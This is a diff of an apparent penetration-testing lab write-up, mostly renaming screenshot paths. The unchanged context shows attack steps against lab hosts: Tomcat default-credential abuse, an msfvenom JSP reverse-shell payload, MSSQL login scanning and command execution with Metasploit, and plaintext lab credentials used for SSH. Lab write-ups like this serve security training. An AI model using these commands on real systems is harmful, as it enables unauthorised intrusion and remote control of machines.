@@ -215,11 +215,11 @@ dirb http://172.16.64.101:8080/
 dirb http://172.16.64.101:9080/
 ```
 
-![](<../../../.gitbook/assets/image (42) (1) (1).png>)
+![](<../../../.gitbook/assets/image (128).png>)
 
-![](<../../../.gitbook/assets/image (68) (1).png>)
+![](<../../../.gitbook/assets/image (459).png>)
 
-![](<../../../.gitbook/assets/image (50) (1).png>)
+![](<../../../.gitbook/assets/image (551).png>)
 
 ```
 tomcat:s3cret
@@ -227,40 +227,40 @@ tomcat:s3cret
 
 ### Exploitation
 
-![](<../../../.gitbook/assets/image (56) (1).png>)
+![](<../../../.gitbook/assets/image (195).png>)
 
 ```
 use exploit/multi/http/tomcat_mgr_upload)
 ```
 
-![](<../../../.gitbook/assets/image (15) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (558).png>)
 
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.64.10 LPORT=4444 -f war -o revshell.war
 ```
 
-![](<../../../.gitbook/assets/image (58) (1).png>)
+![](<../../../.gitbook/assets/image (251).png>)
 
-![](<../../../.gitbook/assets/image (30) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (296).png>)
 
-![](<../../../.gitbook/assets/image (13) (2).png>)
+![](<../../../.gitbook/assets/image (615).png>)
 
-![](<../../../.gitbook/assets/image (61) (1) (1).png>)
+![](<../../../.gitbook/assets/image (451).png>)
 
-![](<../../../.gitbook/assets/image (64) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (280).png>)
 
-![](<../../../.gitbook/assets/image (14) (1).png>)
+![](<../../../.gitbook/assets/image (33).png>)
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 (inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
 ```
 
-![](<../../../.gitbook/assets/image (21) (1).png>)
+![](<../../../.gitbook/assets/image (178).png>)
 
-![](<../../../.gitbook/assets/image (23) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (559).png>)
 
-![](<../../../.gitbook/assets/image (39) (1) (1).png>)
+![](<../../../.gitbook/assets/image (613).png>)
 
 ```
 tomcat:tomcat
@@ -268,50 +268,50 @@ tomcat:s3cret
 role1:tomcat
 ```
 
-![](<../../../.gitbook/assets/image (40) (1) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (244).png>)
 
-![](<../../../.gitbook/assets/image (17) (1) (1).png>)
+![](<../../../.gitbook/assets/image (157).png>)
 
-![](<../../../.gitbook/assets/image (27) (1) (1).png>)
+![](<../../../.gitbook/assets/image (598).png>)
 
-![](<../../../.gitbook/assets/image (22) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (335).png>)
 
-![](<../../../.gitbook/assets/image (55) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (230).png>)
 
 ## Enumeration - 172.16.64.140
 
-![](<../../../.gitbook/assets/image (53) (1).png>)
+![](<../../../.gitbook/assets/image (254).png>)
 
-![](<../../../.gitbook/assets/image (41) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (417).png>)
 
 > The HyperText Transfer Protocol (HTTP) 401 Unauthorized response status code indicates that the client request has not been completed because it lacks valid authentication credentials for the requested resource.
 
-![](<../../../.gitbook/assets/image (57) (1).png>)
+![](<../../../.gitbook/assets/image (263).png>)
 
 ```
 admin:admin
 ```
 
-![](<../../../.gitbook/assets/image (65) (1).png>)
+![](<../../../.gitbook/assets/image (136).png>)
 
-![](<../../../.gitbook/assets/image (67) (1) (1).png>)
+![](<../../../.gitbook/assets/image (236).png>)
 
-![](<../../../.gitbook/assets/image (9) (1) (2).png>)
+![](<../../../.gitbook/assets/image (124).png>)
 
-![](<../../../.gitbook/assets/image (60).png>)
+![](<../../../.gitbook/assets/image (163).png>)
 
-![](<../../../.gitbook/assets/image (52) (1).png>)
+![](<../../../.gitbook/assets/image (306).png>)
 
 ### Exploitation + Credentials
 
-![](<../../../.gitbook/assets/image (36) (1) (1).png>)
+![](<../../../.gitbook/assets/image (79).png>)
 
 ```
 Driver={SQL Server};Server=foosql.foo.com;Database=;Uid=fooadmin;Pwd=fooadmin;
 /var/www/html/project/354253425234234/flag.txt
 ```
 
-![](<../../../.gitbook/assets/image (69) (1) (1).png>)
+![](<../../../.gitbook/assets/image (187).png>)
 
 ## Enumeration - 172.16.64.199
 
@@ -319,7 +319,7 @@ Driver={SQL Server};Server=foosql.foo.com;Database=;Uid=fooadmin;Pwd=fooadmin;
 use auxiliary/scanner/mssql/mssql_login 
 ```
 
-![](<../../../.gitbook/assets/image (34) (1) (1).png>)
+![](<../../../.gitbook/assets/image (20).png>)
 
 {% embed url="https://www.offensive-security.com/metasploit-unleashed/hunting-mssql" %}
 
@@ -327,7 +327,7 @@ use auxiliary/scanner/mssql/mssql_login
 use auxiliary/admin/mssql/mssql_exec
 ```
 
-![](<../../../.gitbook/assets/image (59) (1).png>)
+![](<../../../.gitbook/assets/image (292).png>)
 
 {% embed url="https://www.offensive-security.com/metasploit-unleashed/payloads-mssql" %}
 
@@ -335,17 +335,17 @@ use auxiliary/admin/mssql/mssql_exec
 use windows/mssql/mssql_payload
 ```
 
-![](<../../../.gitbook/assets/image (4) (1) (1).png>)
+![](<../../../.gitbook/assets/image (357).png>)
 
-![](<../../../.gitbook/assets/image (63) (1) (1).png>)
+![](<../../../.gitbook/assets/image (270).png>)
 
-![](<../../../.gitbook/assets/image (66) (1) (1).png>)
+![](<../../../.gitbook/assets/image (198).png>)
 
-![](<../../../.gitbook/assets/image (54) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (65).png>)
 
-![](<../../../.gitbook/assets/image (32) (1).png>)
+![](<../../../.gitbook/assets/image (367).png>)
 
-![](<../../../.gitbook/assets/image (38) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (223).png>)
 
 ```
 ssh://developer:dF3334slKw@172.16.64.182:22
@@ -359,10 +359,10 @@ password: dF3334slKw
 ssh developer@172.16.64.182
 ```
 
-![](<../../../.gitbook/assets/image (62) (1).png>)
+![](<../../../.gitbook/assets/image (239).png>)
 
-![](<../../../.gitbook/assets/image (18) (1) (1) (2).png>)
+![](<../../../.gitbook/assets/image (595).png>)
 
 ### Flag
 
-![](<../../../.gitbook/assets/image (51) (1) (1).png>)
+![](<../../../.gitbook/assets/image (162).png>)
